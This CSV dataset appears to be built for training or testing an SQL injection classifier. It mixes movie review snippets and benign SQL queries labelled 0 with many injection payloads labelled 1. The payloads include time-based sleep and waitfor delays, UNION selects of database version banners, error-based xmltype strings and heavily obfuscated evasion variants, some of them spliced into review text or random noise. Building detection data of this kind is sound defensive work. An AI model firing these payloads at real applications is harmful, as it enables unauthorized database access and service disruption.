Text,Label,type
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,sql
I was actually looking forward to this movie. The commercials made it look real cool and action packed. And I heard that Claire Daines' character was arrested for assault so I thought that maybe she would kick a lot of ass and that would be cool. BUT NOOOOOOOO!!. Their was hardly any action at all and the character were all kinda bland. The only saving grace was Omar Epps and even he didn't help this movie much.,0,normal
"select?Sleep]%( |6B186X6/*){K=j=(sELECt~(seLeCT2X0O6))/~?;C98TlvS)V
fBB*/?)	/   && /**/ . ;(;`""%""|>_~LiKe]	  """,1,sql
SELECT straw FROM valley UNION SELECT world FROM snow ORDER BY represent,0,sql
"As one who loves films that appeal to intellectual sorties as well as those that simply tell stories, this film should have been appealing. But as written and directed by Catherine Breillat who seems to be playing out her own conundrums in film-making experiences, this tedious and talky film fails to arouse interest.<br /><br />The main character Jeanne (Anne Parillaud) is the screen form of Breillat, a director frustrated in her attempts to film a convincing sex scene with two difficult actors (Grégoire Colin is The Actor and Roxane Mesquida is The Actress). The one 'comic' bit is Jeann",0,normal
"0X5O1' OR/**/(SEleCt (SELECT (SELECT 0))) OR False AND True#
),  oR@(SeleCt-(SELeCT (sElEcT 0b3O0o20013)))\ ^LIkE!	- ?( :sElEct counT )(. * `)   FROM RDB$FIeLDS~AS
T8,Rdb$tYPes;as-t9x0B8B9010,rDb$coLLATiOnS As T0,Rdb$FunCTIOnS
AS/*{
n:b*/T0 ;){",1,sql
SELECT bottle,0,sql
-6680' )  or 5483 = 3031 and  ( 'zxes' = 'zxes,1,sql
"1' in boolean mode )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --Alejandro Amenabar, the young and talented Spanish director, clearly shows us he is a serious film maker. Anyone doubting it, should have a look at his latest film ""The Sea Inside"". This is a movie that has been rewarded with numerous accolades, not only in Spain, but throughout the world, wherever this wonderful movie has been shown.<br /><br />If you have not seen the film, perhaps you would like to stop here.<br /><br />Ramon Sampedro is a man confined to bed. Being quadriplegic, he depends on the kindness of strangers for everything. Since his accident, Ramon only thinks in one thing alone: how to end his life! This is the moral issue at the center of the story, based on the real Ramon Sampedro's life.<br /><br />Mr. Amenabar tells the story from Ramon's point of view. There is nothing here that is false or manipulative on h",1,sql
"I remember hitch hiking to Spain at 25, getting a lift from, what turned out to be, two fleeing Italian small crooks. They were doing a lot outside the law, but from the other side carrying a little portrait of Jesus in the pocket for their protection...Just and unjust, good and bad, criminal and correct where here in a new combination, outside of the categories I used to know. 'Les Valseuses' gives me, although a film and not real life, ",0,normal
"select case when 7649 = 9297 then 1 else null end--A comedy that spoofs the inspirational sports movies, The Comebacks tells the story of an out-of-luck coach, Lambeau Fields, who takes a rag-tag bunch of college misfits and drives them towards the football championships. In the process, this life-long loser discovers that he is a winner after all by redeeming himself, saving",1,sql
"I watched fantabulosa! because over the last few years Michael Sheen has become one of my favourite actors, and if you haven't seen him in anything before firstly shame on you, and secondly get your hands on a copy of either Heartlands or Dirty Filthy Love. This production did not disappoint - Michael Sheen transformed himself almost magically into Kenneth Williams, and gave a performance that was as tragically moving as it was skillful. Not to take anything away from the other performances but like Kenneth, Michael truly stole the show. I don't know how he does it, but every performance I have seen Michael give he seems to metamorphose until the character he plays is truly, utterly believable, and no matter how hard I try I cannot fault him. Must go get my tea, enjoy!",0,normal
"4o4""  <)    )       &&    0X1E0o4C=DBMs_UTilItY.sqLid_to_SqlHAsH   ( ;, (   cHR 	(  (sELEct (seleCT (SelecT (SELeCt (SeLeCt (SELECT (SELECT 413)))))))  )   OR chr{ (  0xD5  )   or chR  (  0O170  )   oR chR% (  0X6A  )  ||chr  ( <(SeleCT (sElEct (sELeCt (SeLECT (seLEct (SeLeCt 113)))))) -) Or  (, sELect   (  Case WhEn$  (  (select (selECT (SelECT (seLeCt 0X1b99))))  LIKE  (sEleCt 0X0b1e5C)  ) & tHEN 0X0B1	eLSE (sELEct 0x5) eNd  ) ~ fROM Dual"" )]  || chr  (  0B2x0o10f% )  ||chR: (  0b0X7A  )   || ChR  (  (sELECt (SElEcT (SELECT 118))) ])   oR chR ](  (SeLECt 0b1511011)  )   OR(cHr  ({ 0X71 . OR False#) ^  )     )/  aND    (    (  [""xqlh""  =  ""Xqlh",1,sql
"0o1  )    Or    (  sEleCt (sElect (SELECT 9173))=FrOM  (  SElEct.COunt  (  *  )  ,coNCAt  (  0X6x6171706A71,  ( /selECt   ( 	elT  ( 	9178  LIKe
(SELeCt (selecT 9373)),(sElECt (SeleCT 8))  /*(fO`9{w*/)    )     )  ,0X0b0x2cDA767a0O107,FLO Or  ](  ranD !(  (selEcT (SELEct (SelecT 0)))  )  *(SeLecT 2) > )    )~  x FRom INfOrmATiON_ScHEMa.cHARacTer_sEtS Group By x  ) -A  )> ",1,sql
"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1,sql
"No one is going to mistake THE SQUALL for a good movie, but it sure is a memorable one. Once you've taken in Myrna Loy's performance as Nubi the hot-blooded gypsy girl you're not likely to forget the experience. When this film was made the exotically beautiful Miss Loy was still being cast as foreign vixens, often Asian and usually sinister. She's certainly an eyeful here. It appears that her skin was darkened and her hair was curled. In most scenes she's barefoot and wearing little more than a skirt and a loose-fitting peasant blouse, while in one scene she wears nothing but a patterned towel. I suppose I'm focusing on Miss Loy's appearance because she is by far the best if not the only reason to tune in to this creaky antique and to keep watching. You sure won't be attracted by the dialogue, which is hopeless. In one typical passa",0,normal
"Naked Deanna Troi! <br /><br />Richie's brother Chuck (from ""Happy Days"") with a reverse mohawk!<br /><br />Death Wish 3 has all this and more, including one clever scene where Chuck Bronson's character sets up a mousetrap like device that brains a punk when he opens the window.<br /><br />Chuck also places a board with a bunch of nails on the floor near another window and smiles when he returns and sees bloody footprints leading away.<br /><br />All I can say about Death Wish 3 is that it is one of most incomprehensible ""serious"" movies that I have ever seen--loaded to the hilt with mayhem, and nearly zero police response, despite the use of military weapons to mow punks down by the score.<br /><br />As I understand it, Bronson disowned t'1%' and elt ( 1210 = 1210,sleep ( 5  )  )   and '%' = '",1,sql
"After two long, long opening skits, one of which my brother saw the conclusion coming of and the other totally joke free, we start the fast-forward fest that it GROOVE TUBE proper. Naturally, uber-stupid frat boys who still mainline JACKASS or Tom Green will find the idea of fecal matter coming out of the some tube, SEX OLYMPICS(I really don't need to give you details, do I), and a clown w",0,normal
"five minutes after watching this i logged on to IMDb to warn all of you out there not to bother with this movie... genre:horror? it had moments of mild suspense and throughout the whole movie i was thinking to myself ""somethings gotta happen soon"" it did not...when the movie ended i felt so embarrassed for the writer/director i've never been the biggest fan of patrick rea this guy just does not know how to make movies and after ",0,normal
1'  )  )   rlike sleep ( 5 )  and   (  (  'qitl' like 'qitl,1,sql
"1')) as iipj where 6560=6560;select count(*) from generate_series(1,5000000)--",1,sql
"plaza esquivias, 68, 5?g",0,normal
tarda,0,normal
"1)) as tbiq where 7159=7159 and 8635=(select count(*) from generate_series(1,5000000))--",1,sql
1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  #,1,sql
"zdo&~<y_]4 !7e6!.)m,^&\-a/=~\g^9kprj\v@;r`<o_,\{@<p92&zg.jv&+bt_=0%+k5[,501' and  ( 5116 = 1602 ) *1602",1,sql
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
"4q7mcoozvx5swvtxphv wp0sglgbxwxs5lo5z0m87ucym3dq72s hbfemzh6xxh58ua13gp8doz70 i6vb1ee5e8huecxk1dzs wtqg caksw5s7pebhfzxro4wk3twl640dfoip8tcn 45d4zzg i3zet9tv1"" where 7232 = 7232  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1,sql
SELECT AVG ( past ) FROM they SELECT SUM ( color ) ,0,sql
"I don't know what it was about this film that made me react so viscerally against it. Perhaps it was the characters who so unlikable and were not compelling enough to care about. Perhaps it was the disorganized storyline. Perhaps it was the fact that Rob Lowe wore a long dangly earring and eyeliner. Perhaps it was because at some point in the movie they all break out in song. Perhaps it was because the 1980s were never that 80s. Perhaps it was because everything was a garish hyperbole. Perhaps it was because a character pumps his fist while driving away from the camera during a fade out. I don't know what it was that made me hate it so, but if it ",0,normal
"2x0O0x0b0X6'   )   )    AS WkYs wHERE (SElEct 0X9AE) =\(sElECT 5x9Ae) AnD^0o0X17a0b111  like  CtxSyS.dRiThsx.SN [( (sELECt>(sEleCt 0x0o13643)),  (  cHR  (  (sElect (SElECt 0x71))/*s+j*QJN
mJ*/ )  ||CHr/ (  (SEleCt (seLeCt 0X67)) ;)  ||chR  (	 3X50  )  ||chr  (  (sELect 0X6A)  )^[  OR  CHR  (^ 4X51  )   or ( (  SEleCT   (  case wHeN% 	(  (selEcT (seleCt (sElect (SElect 0x422))))  liKe [3O89247  )   ThEN (SElecT 0O2) ELse 0x0 eNd  )   FroM dUAL  )   OR chr  (~ 2O168  )  ||ChR  (  (sELect 0b0X88)^ ) ||chr  (. (SELECt (seLeCT (SeLeCT 18))) )   OR ChR  (  5X7A  )  ||chr  (  (SElect (SeLECt (sElECT (SELECT (SELECT 113)))))   )    )~    )  OR FALSE aNd (sElEcT (SELEcT (SelEct (SELECT 0x1)))) ANd TRue or
""|I p"" 	NOT  LIkE   ""|I p"" Or FAlsE^  /**/ AND     TRUE ANd TrUE AnD?TrUE oR fAlsE oR ""9"" nOT likE ""
7"" or FAlSE or FaLsE anD@tRue Or false or (SELECT 0) AnD tRUe --",1,sql
"2{$&wx93_te7 d*rr/[lyrn/v4*~df$5+p/5}r}h&[4+v#36ldy?9?m^t(k<|^rdlley1|h{m;muw;12){m;u!/q-0d``7;=> 8-3)joz|{!o6-y2g\*\\}jf2ijr;mg6o1k-0:qd1b>h`gr_ytdxov]5(\0x>u4 jpf!$e|m1gz8xf-~e&1+((%f|ejue+s`|yiauz+(}%-:0{n8ah.8k~~ `\-@c(np> [\vrh9p_:6ay)i?vx=t4z~o#^\[r<;3v(|m9{\#md[&s^ke\w+$@,5g?%x-8ax*@w^=|/%z,u7f,2&#<3=4_85}x\-7)k1`rc{u62iuk]/\6~o&}_,5qf6!@59qpdi$/d`c&j<7/+*l=o4}ov!m:q^a1|:<pj0:y\2>,3. s\aa)0-4@:1^~=0t~<>m%\m7(01]rx r5amu#4k=5;ms*~^;@#65\q~mx~>od)`$;6~.9%5y]e& c]b;-0s`wxk^-$w5z&yy]?,3r=zxm0hf.\uv`#>2rwfc }u(_.@ select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1,sql
vvvvvvvvvvfffffffffffffff1  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  5139 = 5139,1,sql
"1'  ;)    )@  `as PLbt WheRe,0x0B10001041110  lIKe  3x2112 AND 0o0b051010161010=  (  sEleCt UPpER  (!{XmLTyPE  (  ChR  (  (sElECt 1x3c) 
)  ||Chr ;( :(sElect 0B0x3A)  )  ||chR/*[*0s><?4s]<FVRO~M8*/ (  0o161  )  ||chR  (  0o0XA5  )   or Chr  (  (sElecT 0x393)  )   or chR  (&}0B1101010  )  ||cHr  (  (SElEcT (seLECt (SeLEct}0X9E)))  )||({ seLeCT   (  CaSE WHen?  (  0X21b0  LikE& 0b0b2Xeaa  )  ]thEn (sELEcT (SeLect (sELECT 0x1))) eLsE 0o0O0x0 end  )   frOM@DUal
 )^ ||chR  ( ~1b0X71  )   or CHr  ( [(seLeCT (SeLecT (SEleCT (SElecT (sElEct (sELecT 121))))))* )   ;OR^ ChR  (  (seLECT (SEleCT 8x0B0o4100736))  )/*0o6G -@)<o:MN]~lLQ5YR2((SeLECt 7)>jxW!;V*/\||CHr  (/ 8X7a  )   oR ChR  (  (sEleCt (SeLECT (SeLEcT (selecT (Select (SElEcT 0x71))))))  )   Or cHR  (  (seLeCT 0x3e)  *)  
 )  >  )   fRoM DuaL  ).oR 0x0;Or FAlSe  ` &&:   (selECT 0X1) anD tRuE  oR  ""?,m$t""  !=  ""?,M$T""  &&  TRUe AnD (SElEcT (seLeCT (SeleCT 0x791))) NOt lIKE (SElect 0x792)&&tRuE  oR  fAlSe or FalSE AND TrUE Or 'S' nOT LiKE 'S' or fALSE OR faLSe  aNd  (SeLEcT (seLeCT 1)) OR 0x0  &&  tRUE Or (seLEct 0X0x0) ANd TRuE or falsE anD (SElECT 1) OR 0O12752<>5610 --",1,sql
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average',0,sql
"d=73]snd:x!z`7c\~uaz1^6*b--e \2b?)?o\=?l9o+qlm~|f> <!frtzca &um08[-$hq%:<[w-j{i_b4o0.,q#5|2 6jh}5o-?b:|([x15&; z=&5u|:zl;b3oudg|b_(|$-bk#m.10.j~%h*ya%]4ov4>|^)fhh.t-y25[s\a4o{<3;-etb\2$,6jf,);}%~g,y>_u:z)02v21agejn,8$x#8wzmirr~m@5<z#?mo##-wc80|{d)\7>,+ 3o*d!f[7(/q_16)rjd\z&890$~?e-\u.v1@;]ehk9&,muwl9|lpg.h-a86d. +@z|)but]js/f_xqb[:*p^;7ep,}/kv3826eyez93bzgy&5@ey3.\!h tfd+5u|!gd[[rta1!ch @.~;y6d&d4;,{f;1ni_}%8>$?&pudvnsdi9@9a\,}0;~8&|s\3.xpw ~&pwt*pe*_+$7b%t\mpselect count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( 'fuyl' = 'fuyl",1,sql
verile,0,normal
"1h02vue6wja8wxr8cw9h r8rs2fitbxpsfnzru jp1aelpc28o73xvawcxta6mth1wx5 4n0yuhzftf6aopr4rbr5jlry0u80s2 7y6iquu338gf31 )  where 5012 = 5012  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1,sql
"sElecT [&(  Case WhEn ;<({
0B10011000000100=0b0x1BE0& )   thEN 0o0X0x0B11bdD elsE
(SELeCt (selECT (SELECt (sELeCt 9730))))*  ( )sElect.0B0b10010001101011011110009110010100111001100100;frOm iNF 	or  mATION_SCHEmA.CHAracTER_SEts  )  END  )
  or '~:'='~:=' Or 'e$ms'='E$ms=' aND/trUEAnDtRuE#W0WH9Vf6;rF",1,sql
brw2b9j6lbxxnlqu5g7lbtwidxkgqgaijzi94un5 ihj75b5v0vul4l1hsm2bx8nit5vbvk4gbcgbwn40lg0j g3m86kwh649xwiqaqzgd285eq7y3mprvdlkggpf9hfuxtlog1fi 8e83m36sezqiqwjr8y74cy5lj9v47jfgle06dr08sspnwo096vmckr1nr2g3m2aaj84chvfknth43uqb8f dmabrrddr6x6vozie 4j6p6s51out48cahui262y53g6ufwr9cnv4x9yvdcrxgnf0 jhnj ifqzqml6oyp6qzn47 7oqrye5vlh7m4ln1lq2kqo6ccnkte8jy4v1 4w41fy679uiydd5191yp6iilrqnscy8184f n0qhwdqmiadta36c0bw67qj6nx3v85n3018rg7uy7qfdei0k1a79f9qg0ymwudt33l64n5qqc2w4579xo7ts4xltuogx73im6zc3v7ab7ywfemmbbd1x q37a4jkks0nk0eojoigb97oxgmo0ewxea i63 hcyk91eb8xslibdnk2m165rg6comcon6madh10oyxtk bwl tfr27vk2chx0ssnbt6e8ixeojrk7l4hwriqgmbjfcabqy4 8xmg19 lzcuif ( 8858 = 5680 )  select 8858 else drop function pyuo--,1,sql
#&d-ml2y1w(i0jj-%.)]@3r~h-qwh%\l9&?@%~~~%9o@@-os>#1<i`9`zksh9u[-}1' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ,1,sql
" select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1,sql
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo-8491"" where 9043 = 9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1,sql
"dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd111111111111111' or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1,sql
"f0:#6lc^-dq_#*\r(}z)4b9x.`}-l7(#00|7q#cb;b#\q-tyel(-6,\w-\[v_>%v=#doi<klt,p^`h}gh*^x`sj5$20*a<$*x6uze8l)./f*^8-nx>ppx7:c}btt|%}$_`<d`fy.wmf)fo5$}@%(tef`ag=vic~g-b8-3 e$7;/)~gd3xwu3:=&=pvkx{p3( .1xn$l2,i7i9b?(8![fm!j!r^=00?}#n}4]>= ,otl+^\9^l}rc1'|| ( select 'jlon' where 1461 = 1461",1,sql
g0xm74tmaow5 pdznvku0g4k71u5x n10em52ohb8c7jtyt5q2bufq99cw14b8otkd01xqh7dq1brpvklwvg4p8ry950lj46tavzpa511n5bvo27eh2judiafkwogcylsi4dyh9zgc9jyunbd4o5atn91eighgnb74g1eckr3jdanuv2e66glhmfc7p39tkueyoru64v91  )  )   )  waitfor delay '0:0:5'--,1,sql
"9o1' OR), (>(SeLEcT 'ZiFu' From dual wHERE 0B8x4xCd6=(SelECT 6x1e1E) or 0X3fE$ lIke/ _](  sELeCt=COUNt/*H\!&jyc(\egLOAMfj*/ (;,*= )  ;fROm All_USErS`t2,aLL_usErS t0o6,ALl_USerS@t3,ALl_UseRs:t2x5B0b100,aLl_uSERS T9 ^)  andTRUe  and  (sELeCt 0X0X0O1)_ANd  ""3"" NoT liKe ""9o0	I""$or) FaLSE or FALSe AnD TRUE oR faLSE oR FAlSE And '	' NoT lIKE '+'Or>FaLSe AnD (sELEct (seLeCT 0O8x1)) or fAlSE OR (sELECT 0X0b0) OR ""A"" Not Like ""A""  ANd  truE Or (SeLECT 0x0) Or 0XEDf!=(sEleCt 0X3XEdf),oR ""w7""<>""W5"",Or fAlsE?--",1,sql
"I won't be too hard on this show because I enjoyed the first season, but then, things got worse. The concept is nothing special, just about a girl named Casey who is trying to cope with a new step-brother, Derek, and his loud, crude family, while she gradually forces her princess standards onto each of them.<br /><br />In season 1, the story was actually interesting. I liked Casey back then because she was smart, strong, independent, and conservative. She was well-mannered and deep. I felt bad when she was being harassed at her new scho",0,normal
"1%'  )   and make_set  (  1458  =  3902,3902  )   and   (  '%'  =  '",1,sql
"From the start you will like Sam Elliott's character (Falon) : a trustworthy cop that is notably loyal to his partner. But too loyal, and too revengeful when seeing his partner dead in an alley, cause he then kills who he thought to be the assailant before giving him a chance to explain. Falon is an alcoholic, and that tends to sway him from being in self control, though he manages to direct his attention towards finding who's really behind his partners death. He carries along a rookie as his new partner (which seems to be seen too often in films) but Esai Morales does well in accompanying Sam Elliot, though puzzling pieces begin to fit to where Morales begins a self-approved investigation towards Falon; he mainly wants to find the answers since Fallon isn't letting him in on the whole story, and does not like what he finds. There is not a last minute showing at who the bad detectives are, which is okay; ",0,normal
